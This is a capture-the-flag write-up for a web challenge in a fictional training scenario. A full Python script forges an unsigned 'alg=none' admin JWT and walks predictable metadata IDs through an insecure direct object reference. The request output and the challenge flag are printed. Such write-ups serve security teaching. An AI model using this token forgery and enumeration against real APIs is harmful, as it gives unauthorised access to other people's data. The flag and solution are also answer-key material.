# They Lie To You — Chapter 3: Count with Me

## Challenge description

**Points:** 3

```
Hi Senior Researcher,

an unknown perpetrator is attempting to discredit the national research and education network (NREN) and, on their domain theylietoyou.tcc, is publishing entirely unverified hoaxes, fake news, and other thoroughly unscientific content aimed against the mission of the NREN.

Law enforcement authorities have already been informed and they could use your assistance to gather as much information as possible. More information can be found on the website http://theylietoyou.tcc/story-line.

Stay curious!
```

## Summary

With admin access from Chapter 2, the endpoint `GET /api/admin/conf` leaks an arithmetic **formula** for computing user-metadata record IDs. `GET /api/admin/users/{userId}/meta/{metaId}` is an insecure direct object reference (IDOR): the `metaId` isn't random, you just have to *count* it from the formula. Enumerating every user's metadata fields this way reveals the flag hidden inside suspect **userId 17 (`ermartinez`)**'s `Address` value.

## Solution

### Step 1: Become admin and read the counting formula

Reuse the `alg=none` forged `ADMIN` token from Chapter 2. Then:

```
GET /api/admin/conf
```
```json
{"formula":"metaId = baseOffset + (userId * multiplier) + fieldOffset",
 "offsets":{"FirstName":11,"LastName":17,"Email":23,"Address":41,"Sex":53,"Data":99},
 "multiplier":1000,"baseOffset":154700}
```

So every metadata record ID is deterministic:

```
metaId = 154700 + userId*1000 + fieldOffset
```

e.g. userId 17's `Address` record = `154700 + 17000 + 41 = 171741`.

### Step 2: Count the IDs and read each user's metadata (IDOR)

The metadata endpoint doesn't check that the record belongs to you — it only needs the (predictable) `metaId`. Walk all 36 users × 6 fields, compute each ID, fetch it, and grep the contents for a flag.

```python
#!/usr/bin/env python3
"""Solve: They Lie To You Ch3 (Count with Me) — conf formula -> metadata IDOR."""
import base64, json, re, time, uuid, urllib.request

BASE = "http://untraceable-dev-api.theylietoyou.tcc"

def b64url(b): return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

def forge_admin():
    now = int(time.time())
    header = {"alg": "none", "typ": "JWT"}
    payload = {"sub": "1", "aud": "tcc-api", "role": "ADMIN", "iss": BASE,
               "exp": now + 3600, "iat": now, "jti": str(uuid.uuid4()), "username": "admin"}
    h = b64url(json.dumps(header, separators=(",", ":")).encode())
    p = b64url(json.dumps(payload, separators=(",", ":")).encode())
    return f"{h}.{p}."

TOK = forge_admin()

def get(path):
    req = urllib.request.Request(BASE + path, headers={"Authorization": f"Bearer {TOK}"})
    with urllib.request.urlopen(req, timeout=30) as r:
        return json.loads(r.read().decode())

# 1) pull the counting formula
conf = get("/api/admin/conf")
base_off, mult, offs = conf["baseOffset"], conf["multiplier"], conf["offsets"]

# 2) count metaIds for every user/field and hunt for the flag
flag_re = re.compile(r"FLAG\{[^}]+\}")
for uid in range(1, 37):
    for field, foff in offs.items():
        meta_id = base_off + uid * mult + foff        # <-- the "counting"
        content = str(get(f"/api/admin/users/{uid}/meta/{meta_id}").get("content", ""))
        m = flag_re.search(content)
        if m:
            print(f"userId={uid} field={field} metaId={meta_id}")
            print(f"  content: {content}")
            print(f"  FLAG: {m.group(0)}")
```

Output:

```
userId=17 field=Address metaId=171741
  content: Gran Vía 34 219, Barcelona, Spain ; FLAG{Ugaa-S1zs-UwsE-uIUA}
  FLAG: FLAG{Ugaa-S1zs-UwsE-uIUA}
```

## Flag

```
FLAG{Ugaa-S1zs-UwsE-uIUA}
```

## Notes

- The flag is appended to a *real-looking* address field, so a casual look at the profile wouldn't surface it — you only see it by enumerating the raw metadata records.
- Same IDOR + formula is the entry point for Chapter 4 (the `Data` field of userId 17 holds a steganographic PNG instead of the 128-byte encrypted blob every other user has).
```
